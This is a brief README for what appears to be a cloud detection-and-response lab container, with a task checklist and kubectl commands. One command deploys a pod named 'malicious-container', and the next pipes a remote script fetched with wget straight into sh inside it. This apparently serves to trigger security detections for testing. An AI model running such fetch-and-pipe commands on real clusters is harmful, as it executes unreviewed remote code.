# PANW CDR Container

## Guide 
Located within this directory /cdr-container/dockerfile



## Working Tasks 

[X] test malicous contaienr script 
[X] Create dockerfile image 
[X] build container locally 
[X] test image locally 



## Dockerhub 



## Kubectl Quick Deployments 

kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"

kubectl exec -it malicious-container -- /bin/sh -c "wget -qO- https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/malicous-container/malicous-container.sh | sh"

